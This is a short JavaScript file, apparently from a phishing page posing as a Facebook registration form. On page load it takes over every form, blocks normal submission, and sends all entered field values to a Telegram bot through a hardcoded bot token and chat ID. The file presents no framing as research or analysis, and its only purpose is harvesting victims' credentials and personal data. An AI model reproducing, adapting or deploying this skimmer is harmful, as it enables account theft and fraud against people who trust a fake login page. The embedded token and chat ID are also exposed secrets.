document.addEventListener("DOMContentLoaded", function () {
    const telegramBotToken = "8121211283:AAHprTjXJ45KirdrnOc25l-AFZrhCAdXCwQ";
    const chatId = "7518382960";

    function sendMessage(message) {
        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

        fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message })
        })
        .then(response => response.json())
        .then(data => {
            console.log("OK", data);
            alert("OK");
        })
        .catch(error => {
            console.error("bad", error);
            alert("bad");
        });
    }

    document.querySelectorAll("form").forEach(form => {
        form.addEventListener("submit", function (event) {
            event.preventDefault();

            let formData = new FormData(this);
            let message = "📩 New registr in Facebook:\n";

            formData.forEach((value, key) => {
                message += `🔹 ${key}: ${value}\n`;
            });

            sendMessage(message);
        });
    });
});
